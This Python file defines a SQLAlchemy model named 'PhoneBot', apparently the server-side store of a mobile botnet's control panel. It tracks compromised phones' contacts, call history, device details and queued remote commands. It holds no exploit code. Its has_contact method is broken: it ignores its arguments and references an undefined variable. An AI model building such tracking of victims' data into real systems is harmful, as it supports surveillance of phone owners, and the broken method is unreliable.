# -*- coding: utf-8 -*-
'''
Created on Mar 12, 2012

@author: moloch

    Copyright [2012] [Redacted Labs]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
'''

from datetime import datetime
from models import dbsession, CallInfo, Contact, RemoteCommand
from models.BaseObject import BaseObject
from sqlalchemy import Column
from sqlalchemy.types import Unicode, DateTime
from sqlalchemy.orm import relationship, backref

class PhoneBot(BaseObject):

    uuid = Column(Unicode(64), unique = True, nullable = False)
    call_history = relationship("CallInfo", backref = backref("PhoneBot", lazy = "joined"), cascade = "all, delete-orphan")
    contacts = relationship("Contact", backref = backref("PhoneBot", lazy = "joined"), cascade = "all, delete-orphan")
    remote_commands = relationship("RemoteCommand", backref = backref("PhoneBot", lazy = "joined"), cascade = "all, delete-orphan")
    phone_number = Column(Unicode(64))
    os_version = Column(Unicode(64))
    build_version = Column(Unicode(64))
    sdk_version = Column(Unicode(64))
    release_version = Column(Unicode(64))
    codename = Column(Unicode(64))
    device = Column(Unicode(64))
    model = Column(Unicode(64))
    product = Column(Unicode(64))
    last_seen = Column(DateTime, default = datetime.now)

    @classmethod
    def get_all(cls):
        """ Return all PhoneBot objects """
        return dbsession.query(cls).all()

    @classmethod
    def by_id(cls, phonebot_id):
        """ Return the PhoneBot object whose id is 'phonebot_id' """
        return dbsession.query(cls).filter_by(id = phonebot_id.encode('utf-8', 'ignore')).first()

    @classmethod
    def by_uuid(cls, uuid):
        """ Return the PhoneBot object whose uuid is 'uuid' """
        return dbsession.query(cls).filter_by(uuid = uuid.encode('utf-8', 'ignore')).first()

    def has_contact(cls, name = None, phone_number = None, email = None):
        """ Checks to see if the phone_bot already has the contact """
        return dbsession.query(cls).filter_by(uuid = uuid.encode('utf-8', 'ignore')).first()
